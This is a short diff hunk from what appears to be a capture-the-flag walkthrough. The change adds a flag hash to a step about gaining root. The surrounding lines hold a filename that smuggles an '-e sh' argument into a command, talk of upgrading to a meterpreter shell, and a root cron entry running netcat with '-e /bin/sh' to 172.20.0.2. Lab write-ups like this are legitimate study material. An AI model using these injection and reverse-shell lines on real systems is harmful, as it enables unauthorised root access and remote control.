@@ -1538,7 +1538,7 @@ $ touch -- "-e sh root.rdb"
  
 Now we can upgrade to a meterpreter shell with elf method used before to upload a socat or nercat or wherever we need.
  
-11) Now we got root privs and now we can read the user flag
+11) Now we got root privs and now we can read the user flag.c09aca7cb02c968b1e9637d51661f129
 12)now we read the crontab
 * * * * * root /tmp/nc 172.20.0.2 9001 -e /bin/sh
 13)now reading for clean file in cron.d on backup container we see we can upload our cronjob to it and get a reverse shell on backup container to do this we have to:
